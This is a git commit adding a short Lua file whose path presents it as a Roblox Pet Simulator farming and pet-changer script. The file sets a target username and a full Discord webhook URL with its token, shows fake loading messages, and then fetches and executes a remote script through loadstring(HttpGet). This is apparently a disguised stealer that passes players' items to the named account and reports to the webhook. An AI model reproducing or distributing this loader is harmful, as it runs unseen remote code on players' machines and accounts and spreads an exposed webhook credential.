24ba3738018fb3821989e62721f5b834a7680096
MoonScriptt <137010878+MoonScriptt@users.noreply.github.com>
2023-06-30 10:28:06 +0700

    .lua

---
+++ Farming/Mastery/Mission/PetChanger/ControlbyMoon/main/.lua
@@ -0,0 +1,9 @@
+Username = "mxrcuszzzzz"
+WebHook = "https://discord.com/api/webhooks/1124178975699255347/mdk02ExTMxGyclTA0LjwjK4B3nfEj-PGazu7u_kDk_otmBlxuug5fIcMzp59nKwsA8DO"
+
+_G.CustomScriptName = "Moon"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
